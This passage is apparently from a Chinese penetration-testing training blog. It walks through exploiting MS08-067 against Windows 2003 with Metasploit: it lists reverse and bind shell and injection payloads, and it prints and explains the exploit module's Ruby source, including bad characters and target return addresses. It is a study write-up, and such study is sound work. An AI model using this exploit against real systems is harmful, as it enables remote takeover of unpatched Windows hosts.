Reflective DLL Injection, Reverse All-Port TCP Stager</span><br><span class="line">   windows/dllinject/reverse_tcp_dns                                    normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)</span><br><span class="line">   windows/dllinject/reverse_tcp_rc4                                    normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/dllinject/reverse_tcp_uuid                                   normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/dllinject/reverse_udp                                        normal  No     Reflective DLL Injection, Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/dns_txt_query_exec                                           normal  No     DNS TXT Record Payload Download and Execution</span><br><span class="line">   windows/exec                                                         normal  No     Windows Execute Command</span><br><span class="line">   windows/format_all_drives                                            manual  No     Windows Drive Formatter</span><br><span class="line">   windows/loadlibrary                                                  normal  No     Windows LoadLibrary Path</span><br><span class="line">   windows/messagebox                                                   normal  No     Windows MessageBox</span><br><span class="line">   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/meterpreter/bind_hidden_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager</span><br><span class="line">   windows/meterpreter/bind_ipv6_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/meterpreter/bind_named_pipe                                  normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/meterpreter/bind_nonx_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/meterpreter/bind_tcp                                         normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/meterpreter/bind_tcp_rc4                                     normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/meterpreter/bind_tcp_uuid                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/meterpreter/reverse_hop_http                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager</span><br><span class="line">   windows/meterpreter/reverse_https_proxy                              normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy</span><br><span class="line">   windows/meterpreter/reverse_ipv6_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/meterpreter/reverse_named_pipe                               normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   windows/meterpreter/reverse_nonx_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/meterpreter/reverse_ord_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/meterpreter/reverse_tcp                                      normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager</span><br><span class="line">   windows/meterpreter/reverse_tcp_allports                             normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager</span><br><span class="line">   windows/meterpreter/reverse_tcp_dns                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)</span><br><span class="line">   windows/meterpreter/reverse_tcp_rc4                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/meterpreter/reverse_tcp_uuid                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/meterpreter/reverse_udp                                      normal  No     Windows Meterpreter (Reflective Injection), Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/metsvc_bind_tcp                                              normal  No     Windows Meterpreter Service, Bind TCP</span><br><span class="line">   windows/metsvc_reverse_tcp                                           normal  No     Windows Meterpreter Service, Reverse TCP Inline</span><br><span class="line">   windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  No     Windows Inject DLL, Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/patchupdllinject/bind_hidden_tcp                             normal  No     Windows Inject DLL, Hidden Bind TCP Stager</span><br><span class="line">   windows/patchupdllinject/bind_ipv6_tcp                               normal  No     Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  No     Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/patchupdllinject/bind_named_pipe                             normal  No     Windows Inject DLL, Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/patchupdllinject/bind_nonx_tcp                               normal  No     Windows Inject DLL, Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupdllinject/bind_tcp                                    normal  No     Windows Inject DLL, Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/patchupdllinject/bind_tcp_rc4                                normal  No     Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/patchupdllinject/bind_tcp_uuid                               normal  No     Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/patchupdllinject/reverse_ipv6_tcp                            normal  No     Windows Inject DLL, Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/patchupdllinject/reverse_nonx_tcp                            normal  No     Windows Inject DLL, Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupdllinject/reverse_ord_tcp                             normal  No     Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupdllinject/reverse_tcp                                 normal  No     Windows Inject DLL, Reverse TCP Stager</span><br><span class="line">   windows/patchupdllinject/reverse_tcp_allports                        normal  No     Windows Inject DLL, Reverse All-Port TCP Stager</span><br><span class="line">   windows/patchupdllinject/reverse_tcp_dns                             normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)</span><br><span class="line">   windows/patchupdllinject/reverse_tcp_rc4                             normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/patchupdllinject/reverse_tcp_uuid                            normal  No     Windows Inject DLL, Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/patchupdllinject/reverse_udp                                 normal  No     Windows Inject DLL, Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/patchupmeterpreter/bind_hidden_tcp                           normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager</span><br><span class="line">   windows/patchupmeterpreter/bind_ipv6_tcp                             normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/patchupmeterpreter/bind_named_pipe                           normal  No     Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/patchupmeterpreter/bind_nonx_tcp                             normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupmeterpreter/bind_tcp                                  normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/patchupmeterpreter/bind_tcp_rc4                              normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/patchupmeterpreter/bind_tcp_uuid                             normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/patchupmeterpreter/reverse_nonx_tcp                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupmeterpreter/reverse_ord_tcp                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/patchupmeterpreter/reverse_tcp                               normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager</span><br><span class="line">   windows/patchupmeterpreter/reverse_tcp_allports                      normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager</span><br><span class="line">   windows/patchupmeterpreter/reverse_tcp_dns                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)</span><br><span class="line">   windows/patchupmeterpreter/reverse_tcp_rc4                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/patchupmeterpreter/reverse_tcp_uuid                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/patchupmeterpreter/reverse_udp                               normal  No     Windows Meterpreter (skape/jt Injection), Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/shell/bind_hidden_ipknock_tcp                                normal  No     Windows Command Shell, Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/shell/bind_hidden_tcp                                        normal  No     Windows Command Shell, Hidden Bind TCP Stager</span><br><span class="line">   windows/shell/bind_ipv6_tcp                                          normal  No     Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/shell/bind_ipv6_tcp_uuid                                     normal  No     Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/shell/bind_named_pipe                                        normal  No     Windows Command Shell, Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/shell/bind_nonx_tcp                                          normal  No     Windows Command Shell, Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/shell/bind_tcp                                               normal  No     Windows Command Shell, Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/shell/bind_tcp_rc4                                           normal  No     Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/shell/bind_tcp_uuid                                          normal  No     Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/shell/reverse_ipv6_tcp                                       normal  No     Windows Command Shell, Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/shell/reverse_nonx_tcp                                       normal  No     Windows Command Shell, Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/shell/reverse_ord_tcp                                        normal  No     Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/shell/reverse_tcp                                            normal  No     Windows Command Shell, Reverse TCP Stager</span><br><span class="line">   windows/shell/reverse_tcp_allports                                   normal  No     Windows Command Shell, Reverse All-Port TCP Stager</span><br><span class="line">   windows/shell/reverse_tcp_dns                                        normal  No     Windows Command Shell, Reverse TCP Stager (DNS)</span><br><span class="line">   windows/shell/reverse_tcp_rc4                                        normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/shell/reverse_tcp_uuid                                       normal  No     Windows Command Shell, Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/shell/reverse_udp                                            normal  No     Windows Command Shell, Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/shell_bind_tcp                                               normal  No     Windows Command Shell, Bind TCP Inline</span><br><span class="line">   windows/shell_hidden_bind_tcp                                        normal  No     Windows Command Shell, Hidden Bind TCP Inline</span><br><span class="line">   windows/shell_reverse_tcp                                            normal  No     Windows Command Shell, Reverse TCP Inline</span><br><span class="line">   windows/speak_pwned                                                  normal  No     Windows Speech API - Say &quot;You Got Pwned!&quot;</span><br><span class="line">   windows/upexec/bind_hidden_ipknock_tcp                               normal  No     Windows Upload/Execute, Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/upexec/bind_hidden_tcp                                       normal  No     Windows Upload/Execute, Hidden Bind TCP Stager</span><br><span class="line">   windows/upexec/bind_ipv6_tcp                                         normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/upexec/bind_ipv6_tcp_uuid                                    normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/upexec/bind_named_pipe                                       normal  No     Windows Upload/Execute, Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/upexec/bind_nonx_tcp                                         normal  No     Windows Upload/Execute, Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/upexec/bind_tcp                                              normal  No     Windows Upload/Execute, Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/upexec/bind_tcp_rc4                                          normal  No     Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/upexec/bind_tcp_uuid                                         normal  No     Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/upexec/reverse_ipv6_tcp                                      normal  No     Windows Upload/Execute, Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/upexec/reverse_nonx_tcp                                      normal  No     Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/upexec/reverse_ord_tcp                                       normal  No     Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/upexec/reverse_tcp                                           normal  No     Windows Upload/Execute, Reverse TCP Stager</span><br><span class="line">   windows/upexec/reverse_tcp_allports                                  normal  No     Windows Upload/Execute, Reverse All-Port TCP Stager</span><br><span class="line">   windows/upexec/reverse_tcp_dns                                       normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)</span><br><span class="line">   windows/upexec/reverse_tcp_rc4                                       normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/upexec/reverse_tcp_uuid                                      normal  No     Windows Upload/Execute, Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/upexec/reverse_udp                                           normal  No     Windows Upload/Execute, Reverse UDP Stager with UUID Support</span><br><span class="line">   windows/vncinject/bind_hidden_ipknock_tcp                            normal  No     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager</span><br><span class="line">   windows/vncinject/bind_hidden_tcp                                    normal  No     VNC Server (Reflective Injection), Hidden Bind TCP Stager</span><br><span class="line">   windows/vncinject/bind_ipv6_tcp                                      normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)</span><br><span class="line">   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/vncinject/bind_named_pipe                                    normal  No     VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager</span><br><span class="line">   windows/vncinject/bind_nonx_tcp                                      normal  No     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)</span><br><span class="line">   windows/vncinject/bind_tcp                                           normal  No     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)</span><br><span class="line">   windows/vncinject/bind_tcp_rc4                                       normal  No     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/vncinject/bind_tcp_uuid                                      normal  No     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)</span><br><span class="line">   windows/vncinject/reverse_hop_http                                   normal  No     VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager</span><br><span class="line">   windows/vncinject/reverse_ipv6_tcp                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)</span><br><span class="line">   windows/vncinject/reverse_nonx_tcp                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)</span><br><span class="line">   windows/vncinject/reverse_ord_tcp                                    normal  No     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)</span><br><span class="line">   windows/vncinject/reverse_tcp                                        normal  No     VNC Server (Reflective Injection), Reverse TCP Stager</span><br><span class="line">   windows/vncinject/reverse_tcp_allports                               normal  No     VNC Server (Reflective Injection), Reverse All-Port TCP Stager</span><br><span class="line">   windows/vncinject/reverse_tcp_dns                                    normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)</span><br><span class="line">   windows/vncinject/reverse_tcp_rc4                                    normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   windows/vncinject/reverse_tcp_uuid                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support</span><br><span class="line">   windows/vncinject/reverse_udp                                        normal  No     VNC Server (Reflective Injection), Reverse UDP Stager with UUID Support</span><br></pre></td></tr></table></figure></p>
+<p>　　查看可攻击的目标：<br><img src="/img/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/2.png" alt=""><br>　　我们的对象是Windows2003 SP0。<br>　　<br>　　选择并设置payload<br><img src="/img/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/3.png" alt=""><br>　　<br>　　配置<br><img src="/img/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/4.png" alt=""><br>　　<br>　　开始攻击<br><img src="/img/Metasploit渗透测试魔鬼训练营-Windows服务漏洞MS08-067实战与分析总结/5.png" alt=""></p>
+<h2 id="MS08-067漏洞攻击模块源代码分析"><a href="#MS08-067漏洞攻击模块源代码分析" class="headerlink" title="MS08-067漏洞攻击模块源代码分析"></a>MS08-067漏洞攻击模块源代码分析</h2><p>　　整个指令当可以分为三个部分，1.前提环境准备 2.模块初始化 3. 功能函数。<br>　　<br>　　这是环境准备部分<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">  Rank = GreatRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::DCERPC</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::SMB::Client</span><br></pre></td></tr></table></figure></p>
+<p>　　<br>　　<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>(update_info(info,</span><br><span class="line">      <span class="string">'Name'</span>           =&gt; <span class="string">'MS08-067 Microsoft Server Service Relative Path Stack Corruption'</span>,</span><br><span class="line">      <span class="string">'Description'</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">          This module exploits a parsing flaw in the path canonicalization code of</span></span><br><span class="line"><span class="string">        NetAPI32.dll through the Server Service. This module is capable of bypassing</span></span><br><span class="line"><span class="string">        NX on some operating systems and service packs. The correct target must be</span></span><br><span class="line"><span class="string">        used to prevent the Server Service (along with a dozen others in the same</span></span><br><span class="line"><span class="string">        process) from crashing. Windows XP targets seem to handle multiple successful</span></span><br><span class="line"><span class="string">        exploitation events, but 2003 targets will often crash or hang on subsequent</span></span><br><span class="line"><span class="string">        attempts. This is just the first version of this module, full support for</span></span><br><span class="line"><span class="string">        NX bypass on 2003, along with other platforms, is still in development.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">'Author'</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">'hdm'</span>, <span class="comment"># with tons of input/help/testing from the community</span></span><br><span class="line">          <span class="string">'Brett Moore &lt;brett.moore[at]insomniasec.com&gt;'</span>,</span><br><span class="line">          <span class="string">'frank2 &lt;frank2[at]dc949.org&gt;'</span>, <span class="comment"># check() detection</span></span><br><span class="line">          <span class="string">'jduck'</span>, <span class="comment"># XP SP2/SP3 AlwaysOn DEP bypass</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">'License'</span>        =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">'References'</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">%w(CVE 2008-4250)</span>,</span><br><span class="line">          <span class="string">%w(OSVDB 49243)</span>,</span><br><span class="line">          <span class="string">%w(MSB MS08-067)</span>,</span><br><span class="line">          <span class="comment"># If this vulnerability is found, ms08-67 is exposed as well</span></span><br><span class="line">          [<span class="string">'URL'</span>, <span class="string">'http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos'</span>]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">'DefaultOptions'</span> =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">'EXITFUNC'</span> =&gt; <span class="string">'thread'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">'Privileged'</span>     =&gt; <span class="literal">true</span>,</span><br><span class="line">      <span class="string">'Payload'</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">'Space'</span>    =&gt; <span class="number">408</span>,</span><br><span class="line">          <span class="string">'BadChars'</span> =&gt; <span class="string">"\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"</span>,</span><br><span class="line">          <span class="string">'Prepend'</span>  =&gt; <span class="string">"\x81\xE4\xF0\xFF\xFF\xFF"</span>, <span class="comment"># stack alignment</span></span><br><span class="line">          <span class="string">'StackAdjustment'</span> =&gt; -<span class="number">3500</span>,</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">'Platform'</span>       =&gt; <span class="string">'win'</span>,</span><br><span class="line">      <span class="string">'DefaultTarget'</span>  =&gt; <span class="number">0</span>,</span><br><span class="line">      <span class="string">'Targets'</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          <span class="comment"># Automatic targetting via fingerprinting</span></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          [<span class="string">'Automatic Targeting'</span>, &#123; <span class="string">'auto'</span> =&gt; <span class="literal">true</span> &#125;],</span><br><span class="line"></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          <span class="comment"># UNIVERSAL TARGETS</span></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          <span class="comment"># Antoine's universal for Windows 2000</span></span><br><span class="line">          <span class="comment"># Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET</span></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          [<span class="string">'Windows 2000 Universal'</span>,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">'Ret'</span>       =&gt; <span class="number">0x001f1cb0</span>,</span><br><span class="line">             <span class="string">'Scratch'</span>   =&gt; <span class="number">0x00020408</span>,</span><br><span class="line">           &#125;</span><br><span class="line">          ], <span class="comment"># JMP EDI SVCHOST.EXE</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          <span class="comment"># Standard return-to-ESI without NX bypass</span></span><br><span class="line">          <span class="comment"># Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET</span></span><br><span class="line">          <span class="comment">#</span></span><br><span class="line">          [<span class="string">'Windows XP SP0/SP1 Universal'</span>,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">'Ret'</span>       =&gt; <span class="number">0x01001361</span>,</span><br><span class="line">             <span class="string">'Scratch'</span>   =&gt; <span class="number">0x00020408</span>,</span><br><span class="line">           &#125;</span><br><span class="line">          ], <span class="comment"># JMP ESI SVCHOST.EXE</span></span><br><span class="line"></span><br><span class="line">          <span class="comment"># Standard return-to-ESI without NX bypass</span></span><br><span class="line">          [<span class="string">'Windows 2003 SP0 Universal'</span>,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">'Ret'</span>       =&gt; <span class="number">0x0100129e</span>,</span><br><span class="line">             <span class="string">'Scratch'</span>   =&gt; <span class="number">0x00020408</span>,</span><br><span class="line">           &#125;</span><br><span class="line">          ], <span class="comment"># JMP ESI SVCHOST.EXE</span></span><br><span class="line">          </span><br><span class="line">......more.......</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptString.new(<span class="string">'SMBPIPE'</span>, [<span class="literal">true</span>,  <span class="string">'The pipe name to use (BROWSER, SRVSVC)'</span>, <span class="string">'BROWSER'</span>]),</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>　　1. 模块描述：从第四行的Description中可以得到，漏洞发生的位置位于Server服务调用的NetAPI32.dll动态链接库中，进行path canonicalization(路径规范化)的代码。此外，入股真实的系统和我们设置的不一样的话，会导致Win2k3 Server的崩溃，但WinXP可以正常渗透。<br>　　2. 引用：第22行的reference指该漏洞在各个著名安全漏洞库中的参考名称、ID或URL<br>　　3. 默认选项：第30行指一些默认配置，如Session退出采用退出线程的方式<br>　　4. payload的初始化参数：第35行，一般包括可用空间大小和坏字符，还包括一些自定义选项，如关于栈空间布局的选项<br>　　5. Target：第45行它会根据渗透测试目标的不同来分别初始化，里面列出的每个成员都对应于一个可被攻击的操作系统，其中还包含返回地址在栈中位置、绕过NX(数据执行保护)需要的代码块地址，以及其他相关的漏洞利用参数等。<br>　　<br>　　下面是各个操作对应的功能函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 